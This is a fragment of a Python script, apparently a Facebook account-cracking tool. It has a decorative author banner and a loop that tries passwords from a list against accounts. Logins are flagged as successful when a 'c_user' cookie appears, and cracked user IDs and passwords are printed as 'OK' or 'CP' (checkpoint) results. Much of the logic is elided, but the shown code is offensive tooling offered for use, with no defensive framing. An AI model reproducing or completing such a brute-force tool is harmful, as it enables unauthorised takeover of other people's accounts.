...
def banner():
	...
	print("")
	print("%s╔═════════════╗  ࿇⃝🌹⃢𝘼⃢🌹⃝࿇  ╔══════════════════╗"%(Z))
	print("%s║[🔵]𝐀𝐔𝐓𝐇𝐎𝐑   ║  ࿇⃝🌹⃢𝙍⃢🌹⃝࿇  ║𝘼𝙍𝘼𝙁𝘼𝙏            ║"%(Z,B,M,Z))
	print("%s║[🔵]𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢𝘼⃢🌹⃝࿇  ║𝐏𝐫𝐢𝐧𝐜𝐞𝐀𝐫𝐚𝐟𝐚𝐭770   ║"%(Z,B,Z))
	print("%s║[🔵]𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢𝘼🌹⃝࿇  ║𝐏𝐑𝐈𝐍𝐂𝐄-𝐀𝐑𝐀𝐅𝐀𝐓     ║"%(Z,B,Z))
	print("%s║[🔵]𝐅𝐑𝐎𝐌     ║  ࿇⃝🌹⃢0⃢🌹⃝࿇  ║𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║"%(Z,B,H,Z))
	print("%s╚═════════════╝  ࿇⃝🌹⃢4🌹⃝࿇  ╚══════════════════╝  "%(Z))
	print("")
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [ARAFAT-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [ARAFAT-CP] '+uidx+' | '+pasw+'\033[0;97m')
